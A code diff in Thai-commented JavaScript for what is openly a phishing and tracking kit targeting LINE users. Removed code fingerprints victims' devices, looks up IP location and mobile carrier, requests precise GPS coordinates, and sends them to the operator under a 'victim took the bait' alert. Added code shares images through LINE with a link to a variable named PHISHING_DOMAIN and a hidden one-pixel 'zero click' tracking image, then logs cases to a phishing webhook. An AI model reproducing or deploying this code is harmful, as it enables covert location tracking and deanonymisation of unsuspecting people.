-  const match = ua.match(/OS\s(\d+_\d+(_\d+)?)/i) || ua.match(/Version\/(\d+\.\d+)/i);
-  if (match) {
-    return match[1].replace(/_/g, '.');
-  }
-  return "ไม่ทราบเวอร์ชัน";
-}
-
-// ฟังก์ชันดึงเวอร์ชัน macOS
-function getMacOSVersion(ua) {
-  const match = ua.match(/Mac OS X\s*([0-9_\.]+)/i);
-  if (match) {
-    const version = match[1].replace(/_/g, '.');
-    
-    // แปลงเวอร์ชันตัวเลขเป็นชื่อ
-    if (version.startsWith('14')) return "Sonoma";
-    else if (version.startsWith('13')) return "Ventura";
-    else if (version.startsWith('12')) return "Monterey";
-    else if (version.startsWith('11')) return "Big Sur";
-    else if (version.startsWith('10.15')) return "Catalina";
-    else if (version.startsWith('10.14')) return "Mojave";
-    else if (version.startsWith('10.13')) return "High Sierra";
-    else return `macOS ${version}`;
-  }
-  return "macOS";
-}
-
-// ฟังก์ชันดึงเวอร์ชัน Windows
-function getWindowsVersion(ua) {
-  if (/Windows NT 10.0/.test(ua)) return "11/10";
-  else if (/Windows NT 6.3/.test(ua)) return "8.1";
-  else if (/Windows NT 6.2/.test(ua)) return "8";
-  else if (/Windows NT 6.1/.test(ua)) return "7";
-  else if (/Windows NT 6.0/.test(ua)) return "Vista";
-  else if (/Windows NT 5.1/.test(ua)) return "XP";
-  else if (/Windows NT/.test(ua)) return "NT";
-  else return "";
-}
-
-// ฟังก์ชันตรวจสอบประเภทการเชื่อมต่อแบบละเอียด
-function getConnectionInfo() {
-  const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-
-  let connectionInfo = {
-    type: "ไม่สามารถระบุได้",
-    effectiveType: "ไม่สามารถระบุได้",
-    downlink: "ไม่สามารถระบุได้",
-    rtt: "ไม่สามารถระบุได้",
-    saveData: false,
-    isWifi: false,
-    isMobile: false,
-    networkType: "ไม่สามารถระบุได้"
-  };
-
-  if (connection) {
-    // เก็บข้อมูลพื้นฐาน
-    connectionInfo.type = connection.type || "ไม่สามารถระบุได้";
-    connectionInfo.effectiveType = connection.effectiveType || "ไม่สามารถระบุได้";
-    connectionInfo.downlink = connection.downlink || "ไม่สามารถระบุได้";
-    connectionInfo.rtt = connection.rtt || "ไม่สามารถระบุได้";
-    connectionInfo.saveData = connection.saveData || false;
-
-    // ตรวจสอบว่าเป็น WiFi หรือ Mobile
-    if (connection.type === 'wifi') {
-      connectionInfo.isWifi = true;
-      connectionInfo.networkType = "WiFi";
-    }
-    else if (['cellular', 'umts', 'hspa', 'lte', 'cdma', 'evdo', 'gsm', '2g', '3g', '4g', '5g'].includes(connection.type)) {
-      connectionInfo.isMobile = true;
-
-      // ระบุประเภทเครือข่ายโทรศัพท์จาก effectiveType
-      if (connection.effectiveType === 'slow-2g' || connection.effectiveType === '2g') {
-        connectionInfo.networkType = "2G";
-      } else if (connection.effectiveType === '3g') {
-        connectionInfo.networkType = "3G";
-      } else if (connection.effectiveType === '4g') {
-        connectionInfo.networkType = "4G/LTE";
-      } else if (connection.type === '5g') {
-        connectionInfo.networkType = "5G";
-      } else {
-        connectionInfo.networkType = "Mobile Data";
-      }
-    }
-    else {
-      // ตรวจสอบจาก effectiveType หากไม่มีข้อมูล type ที่ชัดเจน
-      if (connection.effectiveType === '4g') {
-        // ส่วนใหญ่ถ้า effectiveType เป็น 4g มักจะเป็น WiFi
-        connectionInfo.isWifi = true;
-        connectionInfo.networkType = "WiFi(น่าจะใช่)";
-      } else if (['slow-2g', '2g', '3g'].includes(connection.effectiveType)) {
-        connectionInfo.isMobile = true;
-        connectionInfo.networkType = "Mobile Data";
-      }
-    }
-  }
-
-  return connectionInfo;
-}
-
-// ฟังก์ชันตรวจสอบระดับแบตเตอรี่
-async function getBatteryInfo() {
-  try {
-    // ตรวจสอบว่าสามารถเข้าถึง Battery API ได้หรือไม่
-    if (navigator.getBattery) {
-      const battery = await navigator.getBattery();
-      return {
-        level: Math.floor(battery.level * 100) + "%",
-        charging: battery.charging ? "กำลังชาร์จ" : "ไม่ได้ชาร์จ"
-      };
-    }
-
-    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
-  } catch (error) {
-    return "ไม่สามารถเข้าถึงข้อมูลแบตเตอรี่ได้";
-  }
-}
-
-// ฟังก์ชันตรวจสอบประเภทเบราว์เซอร์
-function detectBrowser() {
-  const userAgent = navigator.userAgent;
-  let browserName = "ไม่ทราบ";
-  let browserVersion = "ไม่ทราบ";
-  let browserEngine = "";
-
-  // ตรวจสอบเบราว์เซอร์ที่นิยมใช้ในปัจจุบัน (2023-2024)
-  if (userAgent.indexOf("Edg") > -1) {
-    browserName = "Microsoft Edge";
-    const match = userAgent.match(/Edg\/([\d\.]+)/);
-    if (match) browserVersion = match[1];
-    browserEngine = "Chromium";
-  } else if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Safari") > -1) {
-    // ตรวจสอบเบราว์เซอร์บนมือถือยอดนิยมก่อน
-    if (userAgent.indexOf("SamsungBrowser") > -1) {
-      browserName = "Samsung Browser";
-      const match = userAgent.match(/SamsungBrowser\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("Line") > -1 || userAgent.indexOf("NAVER") > -1) {
-      if (userAgent.indexOf("Line") > -1) {
-        browserName = "LINE Browser";
-        const match = userAgent.match(/Line\/([\d\.]+)/);
-        if (match) browserVersion = match[1];
-      } else {
-        browserName = "NAVER Browser";
-      }
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("MiuiBrowser") > -1) {
-      browserName = "MIUI Browser";
-      const match = userAgent.match(/MiuiBrowser\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("OPR") > -1 || userAgent.indexOf("Opera") > -1) {
-      browserName = "Opera";
-      const match = userAgent.match(/OPR\/([\d\.]+)/) || userAgent.match(/Opera\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("Brave") > -1) {
-      browserName = "Brave";
-      const match = userAgent.match(/Chrome\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("YaBrowser") > -1) {
-      browserName = "Yandex";
-      const match = userAgent.match(/YaBrowser\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else if (userAgent.indexOf("Vivaldi") > -1) {
-      browserName = "Vivaldi";
-      const match = userAgent.match(/Vivaldi\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    } else {
-      browserName = "Chrome";
-      const match = userAgent.match(/Chrome\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-      browserEngine = "Chromium";
-    }
-    
-    // ตรวจสอบ WebView บน Android
-    if (userAgent.indexOf("; wv") > -1) {
-      browserName += " WebView";
-    }
-  } else if (userAgent.indexOf("Firefox") > -1) {
-    browserName = "Firefox";
-    const match = userAgent.match(/Firefox\/([\d\.]+)/);
-    if (match) browserVersion = match[1];
-    browserEngine = "Gecko";
-  } else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) {
-    browserName = "Safari";
-    const match = userAgent.match(/Version\/([\d\.]+)/);
-    if (match) browserVersion = match[1];
-    browserEngine = "WebKit";
-    
-    // ตรวจสอบเพิ่มเติมสำหรับ WebView บน iOS
-    if (userAgent.indexOf("CriOS") > -1) {
-      browserName = "Chrome for iOS";
-      const match = userAgent.match(/CriOS\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-    } else if (userAgent.indexOf("FxiOS") > -1) {
-      browserName = "Firefox for iOS";
-      const match = userAgent.match(/FxiOS\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-    } else if (userAgent.indexOf("EdgiOS") > -1) {
-      browserName = "Edge for iOS";
-      const match = userAgent.match(/EdgiOS\/([\d\.]+)/);
-      if (match) browserVersion = match[1];
-    } else if (userAgent.indexOf("FBIOS") > -1) {
-      browserName = "Facebook App WebView";
-      browserEngine = "WebKit (In-App)";
-    } else if (userAgent.indexOf("Instagram") > -1) {
-      browserName = "Instagram App WebView";
-      browserEngine = "WebKit (In-App)";
-    } else if (userAgent.indexOf("Line") > -1) {
-      browserName = "LINE App WebView";
-      browserEngine = "WebKit (In-App)";
-    }
-  } else if (userAgent.indexOf("MSIE") > -1 || userAgent.indexOf("Trident") > -1) {
-    browserName = "Internet Explorer";
-    const match = userAgent.match(/(?:MSIE |rv:)([\d\.]+)/);
-    if (match) browserVersion = match[1];
-    browserEngine = "Trident";
-  }
-
-  return browserEngine ? `${browserName} ${browserVersion} (${browserEngine})` : `${browserName} ${browserVersion}`;
-}
-
-// ฟังก์ชันดึงข้อมูล IP โดยละเอียด (ใช้ ipinfo.io)
-async function getIPDetails() {
-  try {
-    // ใช้ ipinfo.io ซึ่งรวม IP และรายละเอียดในครั้งเดียว (ฟรี ไม่ต้องใช้ API key, มี rate limit)
-    const response = await fetch('https://ipinfo.io/json');
-    if (!response.ok) {
-      throw new Error(`ipinfo.io request failed with status ${response.status}`);
-    }
-    const ipDetails = await response.json();
-
-    // จัดรูปแบบข้อมูลให้สอดคล้องกับโครงสร้างเดิม + เพิ่มเติม
-    return {
-      ip: ipDetails.ip || "ไม่สามารถระบุได้",
-      hostname: ipDetails.hostname || "ไม่มีข้อมูล", // เพิ่ม hostname
-      city: ipDetails.city || "ไม่ทราบ",
-      region: ipDetails.region || "ไม่ทราบ",
-      country: ipDetails.country || "ไม่ทราบ", // ipinfo ใช้ 'country' code (e.g., TH)
-      loc: ipDetails.loc || "ไม่มีข้อมูล", // พิกัด lat,long จาก IP
-      org: ipDetails.org || "ไม่ทราบ", // องค์กร/ISP (ASN + Name)
-      postal: ipDetails.postal || "ไม่มีข้อมูล", // รหัสไปรษณีย์
-      timezone: ipDetails.timezone || "ไม่ทราบ",
-      // แยก ASN และ ISP/Org name ถ้าเป็นไปได้
-      asn: ipDetails.org ? ipDetails.org.split(' ')[0] : "ไม่ทราบ",
-      isp: ipDetails.org ? ipDetails.org.substring(ipDetails.org.indexOf(' ') + 1) : "ไม่ทราบ"
-    };
-  } catch (error) {
-    console.error("ไม่สามารถดึงข้อมูล IP จาก ipinfo.io ได้:", error);
-    // ลองใช้ fallback (ipify) หาก ipinfo ล้มเหลว
-    try {
-      const basicResponse = await fetch('https://api.ipify.org?format=json');
-      const basicData = await basicResponse.json();
-      return { ip: basicData.ip || "ไม่สามารถระบุได้" }; // คืนค่า IP พื้นฐาน
-    } catch (fallbackError) {
-      console.error("ไม่สามารถดึง IP จาก fallback (ipify) ได้:", fallbackError);
-      return { ip: "ไม่สามารถระบุได้" };
-    }
-  }
-}
-
-// ฟังก์ชันที่พยายามประมาณการเบอร์โทรศัพท์ (มีข้อจำกัด)
-async function estimatePhoneNumber() {
-  const phoneInfo = {
-    mobileOperator: "ไม่สามารถระบุได้",
-    possibleOperator: "ไม่สามารถระบุได้",
-    countryCode: "ไม่สามารถระบุได้",
-    remarks: "ไม่สามารถระบุเบอร์โทรศัพท์โดยตรงเนื่องจากข้อจำกัดความเป็นส่วนตัวของเบราว์เซอร์"
-  };
-
-  try {
-    // ตรวจสอบผู้ให้บริการโทรศัพท์จากข้อมูล IP
-    const ipDetails = await getIPDetails();
-
-    // ตรวจสอบข้อมูลผู้ให้บริการจาก isp ที่ได้จาก ipapi.co
-    const ispInfo = ipDetails.isp || "";
-
-    // ตรวจสอบผู้ให้บริการในประเทศไทย
-    const thaiOperators = {
-      "AIS": ["AIS", "Advanced Info Service", "AWN", "ADVANCED WIRELESS NETWORK"],
-      "DTAC": ["DTAC", "Total Access Communication", "DTN", "DTAC TriNet"],
-      "TRUE": ["TRUE", "True Move", "TrueMove", "True Corporation", "TrueOnline", "Real Future"],
-      "NT": ["CAT", "TOT", "National Telecom", "NT", "CAT Telecom", "TOT Public Company Limited"],
-      "3BB": ["Triple T Broadband", "3BB", "Triple T Internet"]
-    };
-
-    // ค้นหาผู้ให้บริการจากชื่อ ISP
-    for (const [operator, keywords] of Object.entries(thaiOperators)) {
-      if (keywords.some(keyword => ispInfo.includes(keyword))) {
-        phoneInfo.possibleOperator = operator;
-        break;
-      }
-    }
-
-    // ตรวจสอบข้อมูลเพิ่มเติมจาก User Agent
-    const userAgent = navigator.userAgent;
-    if (userAgent.includes("Android")) {
-      // บนแอนดรอยด์อาจมีชื่อเครือข่ายซ่อนอยู่ใน User-Agent บางรุ่น (แต่ปัจจุบันไม่ค่อยมีแล้ว)
-      for (const [operator, keywords] of Object.entries(thaiOperators)) {
-        if (keywords.some(keyword => userAgent.includes(keyword))) {
-          phoneInfo.mobileOperator = operator;
-          break;
+        
+        // ฟังก์ชันตรวจสอบสิทธิ์แบบ Fallback (ใช้เมื่อไม่สามารถเชื่อมต่อกับ server ได้)
+        function checkUserPermissionFallback(userId) {
+            // กำหนด userId ที่มีสิทธิ์ใช้งานล่วงหน้า (ควรเป็น admin เท่านั้น)
+            const approvedUserIds = [
+                'U69aa2cb90c9f40291278c346c50dc021' // ไอดีผู้ดูแลระบบจากไฟล์ LineOA.html
+                // สามารถเพิ่ม userId อื่นๆ ที่อนุมัติแล้วได้
+            ];
+            
+            return approvedUserIds.includes(userId);
         }
-      }
-    }
+        
+        // ฟังก์ชันเปิดใช้งานฟอร์ม
+        function enableForm() {
+            document.getElementById('caseName').disabled = false;
+            // document.getElementById('generateTrackingBtn').disabled = false; // Removed reference
+            document.getElementById('selectImageBtn').disabled = false;
+            checkCanShare(); // ตรวจสอบว่าปุ่มแชร์ควรเปิดใช้งานหรือไม่
+        }
+        
+        // ฟังก์ชันปิดใช้งานฟอร์ม
+        function disableForm() {
+            document.getElementById('caseName').disabled = true;
+            // document.getElementById('generateTrackingBtn').disabled = true; // Removed reference
+            document.getElementById('selectImageBtn').disabled = true;
+            document.getElementById('shareBtn').disabled = true;
+        }
+        
+        // ตั้งค่า Event Listeners
+        function setupEventListeners() {
+            // ปุ่มเลือกรูปภาพ
+            document.getElementById('selectImageBtn').addEventListener('click', function() {
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                document.getElementById('imageUpload').click();
+            });
+            
+            // การเลือกรูปภาพ
+            document.getElementById('imageUpload').addEventListener('change', handleImageSelect);
+            
+            // ปุ่มสร้าง Tracking Key
+            // Removed event listener for generateTrackingBtn
+            // document.getElementById('generateTrackingBtn').addEventListener('click', function() { ... });
+            
+            // ปุ่มแชร์รูปภาพ
+            document.getElementById('shareBtn').addEventListener('click', function() {
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                shareImage();
+            });
+            
+            // การเปลี่ยนแปลงชื่อเคส
+            document.getElementById('caseName').addEventListener('input', checkCanShare);
+            
+            // Drag and drop สำหรับรูปภาพ
+            const dropArea = document.querySelector('.image-preview-container');
+            
+            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+                dropArea.addEventListener(eventName, preventDefaults, false);
+            });
+            
+            function preventDefaults(e) {
+                e.preventDefault();
+                e.stopPropagation();
+            }
+            
+            ['dragenter', 'dragover'].forEach(eventName => {
+                dropArea.addEventListener(eventName, highlight, false);
+            });
+            
+            ['dragleave', 'drop'].forEach(eventName => {
+                dropArea.addEventListener(eventName, unhighlight, false);
+            });
+            
+            function highlight() {
+                if (!userHasPermission) return;
+                dropArea.style.borderColor = '#00B900';
+                dropArea.style.backgroundColor = '#f0f8f0';
+            }
+            
+            function unhighlight() {
+                if (!userHasPermission) return;
+                dropArea.style.borderColor = '#ddd';
+                dropArea.style.backgroundColor = '#fafafa';
+            }
+            
+            dropArea.addEventListener('drop', function(e) {
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                handleDrop(e);
+            }, false);
+            
+            function handleDrop(e) {
+                const dt = e.dataTransfer;
+                const files = dt.files;
+                if (files.length) {
+                    document.getElementById('imageUpload').files = files;
+                    handleImageSelect({ target: { files: files } });
+                }
+            }
+            
+            // คลิกที่พื้นที่รูปภาพเพื่อเลือกรูปภาพ
+            dropArea.addEventListener('click', function() {
+                if (!userHasPermission) {
+                    showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                    return;
+                }
+                document.getElementById('imageUpload').click();
+            });
+        }
+        
+        // ฟังก์ชันจัดการรูปภาพที่เลือก
+        function handleImageSelect(event) {
+            if (!userHasPermission) {
+                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                return;
+            }
+            
+            const file = event.target.files[0];
+            if (!file) return;
+            
+            // ตรวจสอบว่าเป็นรูปภาพหรือไม่
+            if (!file.type.match('image.*')) {
+                showStatus('กรุณาเลือกไฟล์รูปภาพเท่านั้น', false);
+                return;
+            }
+            
+            // ตรวจสอบขนาดรูปภาพ (จำกัดขนาดไฟล์ไม่เกิน 10MB)
+            if (file.size > 10 * 1024 * 1024) {
+                showStatus('รูปภาพมีขนาดใหญ่เกินไป (ไม่เกิน 10MB)', false);
+                return;
+            }
+            
+            selectedImage = file;
+            
+            // แสดงตัวอย่างรูปภาพ
+            const reader = new FileReader();
+            reader.onload = function(e) {
+                const img = document.getElementById('imagePreview');
+                img.src = e.target.result;
+                img.style.display = 'block';
+                document.getElementById('uploadPrompt').style.display = 'none';
+            };
+            reader.readAsDataURL(file);
+            
+            // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
+            checkCanShare();
+        }
+        
+        // ฟังก์ชันอัพโหลดรูปภาพไปยัง ImgBB
+        async function uploadImage() {
+            if (!selectedImage) {
+                showStatus('กรุณาเลือกรูปภาพก่อน', false);
+                return null;
+            }
+            
+            // แสดง loader
+            document.querySelector('.loader').style.display = 'block';
+            
+            try {
+                // ใช้ ImgBB API สำหรับอัพโหลดรูปภาพ
+                const formData = new FormData();
+                formData.append('image', selectedImage);
+                formData.append('key', IMGBB_API_KEY);
+                
+                const response = await fetch('https://api.imgbb.com/1/upload', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                // ซ่อน loader
+                document.querySelector('.loader').style.display = 'none';
+                
+                if (data.success) {
+                    return data.data.url;
+                } else {
+                    throw new Error(data.error.message || 'การอัพโหลดล้มเหลว');
+                }
+            } catch (error) {
+                console.error('Error uploading image:', error);
+                showStatus('เกิดข้อผิดพลาดในการอัพโหลดรูปภาพ: ' + error.message, false);
+                // ซ่อน loader
+                document.querySelector('.loader').style.display = 'none';
+                return null;
+            }
+        }
+        
+        // ฟังก์ชันสร้าง Tracking Key
+        function generateTrackingKey() {
+            if (!userHasPermission) {
+                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                return;
+            }
+            
+            const caseName = document.getElementById('caseName').value;
+            if (!caseName) {
+                showStatus('กรุณาระบุชื่อเคส', false);
+                return;
+            }
+            
+            // สร้าง Tracking Key
+            const now = new Date();
+            const timestamp = now.getTime().toString(36);
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let randomPart = '';
+            for (let i = 0; i < 4; i++) {
+                randomPart += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            
+            trackingKey = timestamp + '-' + randomPart;
+            // บันทึก Tracking Key และ Case Name จะถูกย้ายไปทำหลังแชร์สำเร็จ
+            // saveTrackingCaseMapping(trackingKey, caseName); // <-- Removed from here
+            
+            showStatus(`Tracking Key สร้างสำเร็จ: ${trackingKey}`, true); // Keep status message
+            
+            // ตรวจสอบว่าสามารถแชร์ได้หรือไม่
+            checkCanShare();
+        }
+        
+        // ฟังก์ชันบันทึก Tracking Key และ Case Name (ส่งไปที่ GoogleScript.html)
+        async function saveTrackingCaseMapping(trackKey, caseName) {
+            if (!isLiffInitialized || !userId) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                return false;
+            }
+            
+            try {
+                // ส่งข้อมูลไปยัง Google Script Webhook (GoogleScript.html)
+                const response = await fetch(PHISHING_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'saveTrackingMapping',
+                        trackingKey: trackKey,
+                        caseName: caseName,
+                        creatorId: userId,
+                        creatorName: displayName,
+                        imageUrl: imageUrl, // <-- Add the image URL here
+                        requestId: generateUniqueId()
+                    }),
+                    mode: 'no-cors' // Note: 'no-cors' might hide errors from the server. Consider changing if debugging server issues.
+                });
+                
+                console.log('บันทึก Tracking Key สำเร็จ');
+                return true;
+            } catch (error) {
+                console.error('เกิดข้อผิดพลาดในการบันทึก Tracking Key', error);
+                return false;
+            }
+        }
+        
+        // ฟังก์ชันตรวจสอบว่าสามารถแชร์ได้หรือไม่
+        function checkCanShare() {
+            const caseName = document.getElementById('caseName').value;
+            const shareBtn = document.getElementById('shareBtn');
+            
+            if (selectedImage && caseName && userHasPermission) {
+                shareBtn.disabled = false;
+            } else {
+                shareBtn.disabled = true;
+            }
+        }
+        
+        // ฟังก์ชันแชร์รูปภาพ
+        async function shareImage() {
+            if (!isLiffInitialized) {
+                showStatus('กรุณารอให้ LIFF เริ่มต้นก่อน', false);
+                return;
+            }
+            
+            if (!userHasPermission) {
+                showStatus('คุณไม่มีสิทธิ์ใช้งานระบบนี้', false);
+                return;
+            }
+            
+            const caseName = document.getElementById('caseName').value;
+            if (!caseName) {
+                showStatus('กรุณาระบุชื่อเคส', false);
+                return;
+            }
+            
+            if (!selectedImage) {
+                showStatus('กรุณาเลือกรูปภาพ', false);
+                return;
+            }
+            
+            // สร้าง Tracking Key อัตโนมัติทุกครั้งที่กดแชร์
+            generateTrackingKey(); 
+            
+            // ตรวจสอบว่ามี trackingKey หรือไม่หลังจากการสร้าง
+            if (!trackingKey) {
+                 showStatus('ไม่สามารถสร้าง Tracking Key ได้', false);
+                 return; // หยุดการทำงานถ้าสร้าง Key ไม่สำเร็จ
+            }
 
-    // ดึงข้อมูลประเทศจาก IP
-    if (ipDetails.country) {
-      phoneInfo.countryCode = ipDetails.country;
+            try {
+                // อัพโหลดรูปภาพ
+                imageUrl = await uploadImage();
+                if (!imageUrl) return;
+                
+                // สร้าง URL สำหรับคลิก (ชี้ไปที่ index.html พร้อม tracking key)
+                const clickTrackUrl = `${PHISHING_DOMAIN}?daily=${trackingKey}`; // PHISHING_DOMAIN should point to index.html
+                
+                // รวบรวมข้อมูลอุปกรณ์สำหรับส่งใน Zero Click tracking URL
+                const randomSuffix = Date.now() + Math.random().toString(36).substring(2, 10);
+                
+                // ปรับปรุง: ใช้เป็น URL สั้นๆ อย่างเดียว ไม่ใส่ข้อมูลอื่นๆ เพื่อหลีกเลี่ยงปัญหา
+                // ข้อมูลทั้งหมดจะถูกส่งโดยตรงผ่าน Headers เมื่อรูปถูกโหลด
+                let zeroClickTrackUrl = `${PIXEL_TRACKING_URL}?action=zeroClick`;
+                zeroClickTrackUrl += `&key=${trackingKey}`;
+                zeroClickTrackUrl += `&isTarget=true`; 
+                zeroClickTrackUrl += `&r=${randomSuffix}`; // ป้องกันการแคช
+                
+                console.log("Zero Click Track URL:", zeroClickTrackUrl);
 
-      // ถ้าเป็นประเทศไทยให้ระบุรหัสประเทศ
-      if (ipDetails.country === "Thailand" || ipDetails.country === "TH") {
-        phoneInfo.countryCode = "+66";
-      }
-    }
+                // สร้าง Flex Message ใหม่ ใช้ <img> ใน footer แทน ซึ่งมักจะโหลดดีกว่าเดิม
+                const message = {
+                    type: 'flex',
+                    altText: `รูปภาพใหม่`, 
+                    contents: {
+                        type: 'bubble',
+                        hero: {
+                            type: 'image',
+                            url: imageUrl,
+                            size: 'full',
+                            aspectRatio: '1:1',
+                            aspectMode: 'cover',
+                            action: {
+                                type: 'uri',
+                                uri: clickTrackUrl
+                            }
+                        },
+                        body: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'text',
+                                    text: ' ',  // ใส่ช่องว่างเพื่อให้มี body content
+                                    color: '#FFFFFF',
+                                    size: '1px'
+                                }
+                            ],
+                            paddingAll: '0px'
+                        },
+                        footer: {
+                            type: 'box',
+                            layout: 'vertical',
+                            contents: [
+                                {
+                                    type: 'image',
+                                    url: zeroClickTrackUrl,
+                                    size: '1px',
+                                    aspectRatio: '1:1'
+                                }
+                            ],
+                            paddingAll: '0px'
+                        }
+                    }
+                };
 
-    // ตรวจสอบ Network Information API เพิ่มเติม
-    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-    if (connection && connection.type === 'cellular') {
-      phoneInfo.remarks = "เชื่อมต่อผ่านเครือข่ายมือถือ " + (phoneInfo.possibleOperator !== "ไม่สามารถระบุได้" ? phoneInfo.possibleOperator : "");
-    }
+                // แนวทางที่ 2: ใช้ template message พื้นฐานกับ image ปกติ
+                const messageAlt = {
+                    type: "template",
+                    altText: "รูปภาพใหม่",
+                    template: {
+                        type: "image_carousel",
+                        columns: [{
+                            imageUrl: imageUrl,
+                            action: {
+                                type: "uri",
+                                uri: clickTrackUrl
+                            }
+                        }]
+                    }
+                };
+                
+                // เก็บข้อมูล metadata เพิ่มเติมที่จะส่ง
+                const metadata = {
+                    creator: userId,
+                    creatorName: displayName,
+                    trackingKey: trackingKey,
+                    caseName: caseName,
+                    timestamp: new Date().toISOString()
+                };
+                
+                // บันทึก metadata ไว้ใน sessionStorage เพื่อใช้ในอนาคต
+                sessionStorage.setItem(`metadata_${trackingKey}`, JSON.stringify(metadata));
 
-    return phoneInfo;
+                console.log("Attempting to share Message:", JSON.stringify(message, null, 2));
 
-  } catch (error) {
-    console.error("ไม่สามารถประมาณการเบอร์โทรศัพท์ได้:", error);
-    return phoneInfo;
-  }
-}
+                if (liff.isApiAvailable('shareTargetPicker')) {
+                    console.log("ShareTargetPicker is available. Calling now...");
+                    
+                    // ทดลองใช้ message รูปแบบทางเลือกถ้ารูปแบบแรกมีปัญหา
+                    // สามารถสลับระหว่าง message และ messageAlt เพื่อทดสอบ
+                    const result = await liff.shareTargetPicker([message]);
+                    
+                    console.log("ShareTargetPicker result:", result);
 
-// ฟังก์ชันพยายามดึงข้อมูลตำแหน่ง
-function tryGetLocation(ipData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName) {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      function(position) {
-        // เมื่อได้รับพิกัด
-        const lat = position.coords.latitude;
-        const long = position.coords.longitude;
-        const accuracy = position.coords.accuracy;
-        const locationData = {
-          lat: lat,
-          long: long,
-          accuracy: accuracy,
-          gmapLink: `https://www.google.com/maps?q=${lat},${long}`
-        };
+                    if (result) {
+                        showStatus('แชร์รูปภาพสำเร็จ', true);
+                        
+                        // บันทึก Tracking Key Mapping ก่อน 
+                        try {
+                            const saved = await saveTrackingCaseMapping(trackingKey, caseName);
+                            if (!saved) {
+                                console.log('เรียกใช้ saveTrackingCaseMapping เสร็จสิ้น (อาจมีข้อผิดพลาดฝั่ง Server หรือ CORS)');
+                            } else {
+                                console.log('บันทึก Tracking Key Mapping สำเร็จ (ตามที่ Client รับรู้)');
+                            }
+                        } catch (saveError) {
+                            console.error('เกิดข้อผิดพลาดขณะเรียก saveTrackingCaseMapping:', saveError);
+                            showStatus('เกิดข้อผิดพลาดในการบันทึก Tracking Key: ' + saveError.message, false);
+                        }
 
-        // ส่งข้อมูลอีกครั้งพร้อมพิกัด
-        sendToLineNotify(ipData, locationData, timestamp, referrer, deviceData, phoneInfo, trackingKey, caseName);
-      },
-      function(error) {
-        console.log("ผู้ใช้ไม่อนุญาตให้เข้าถึงตำแหน่ง:", error.message);
-        // ไม่ต้องส่งข้อมูลอีกครั้ง เพราะส่งไปแล้วในครั้งแรก
-      },
-      {
-        timeout: 5000,
-        enableHighAccuracy: true
-      }
-    );
-  }
-}
+                        // รีเซ็ตหน้าจอ
+                        resetForm();
+                    } else {
+                        showStatus('การแชร์ถูกยกเลิก', false);
+                    }
+                } else {
+                    showStatus('ShareTargetPicker ไม่พร้อมใช้งาน', false);
+                }
+            } catch (error) {
+                console.error('Error in shareImage function:', error);
+                showStatus('เกิดข้อผิดพลาดในการแชร์รูปภาพ: ' + (error.message || error), false);
+            }
+        }
+        
+        // ฟังก์ชันแสดงสถานะ
+        function showStatus(message, isSuccess) {
+            const statusEl = document.getElementById('statusMessage');
+            statusEl.textContent = message;
+            statusEl.style.display = 'block';
+            
+            if (isSuccess) {
+                statusEl.className = 'status success';
+            } else {
+                statusEl.className = 'status error';
+            }
+            
+            // ซ่อนสถานะหลังจาก 5 วินาที
+            setTimeout(() => {
+                statusEl.style.display = 'none';
+            }, 5000);
+        }
+        
+        // ฟังก์ชันรีเซ็ตแบบฟอร์ม
+        function resetForm() {
+            document.getElementById('caseName').value = '';
+            document.getElementById('imageUpload').value = '';
+            document.getElementById('imagePreview').style.display = 'none';
+            document.getElementById('uploadPrompt').style.display = 'block';
+            document.getElementById('shareBtn').disabled = true;
+            
+            selectedImage = null;
+            trackingKey = "";
+            imageUrl = "";
+        }
+        
+        // ฟังก์ชันสร้าง ID เฉพาะ
+        function generateUniqueId() {
+            return Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+        }
 
-// ฟังก์ชันสร้างข้อความแจ้งเตือนแบบละเอียด
-function createDetailedMessage(ipData, location, timestamp, deviceData, phoneInfo, trackingKey, caseName) {
-  // ข้อความหลัก
-  const message = [
-    "🎣แจ้งเตือนเหยื่อกินเบ็ด\n",
-    `⏰เวลา: ${timestamp}`,
-  ];
-  // เพิ่มข้อมูล Case Name (ถ้ามี)
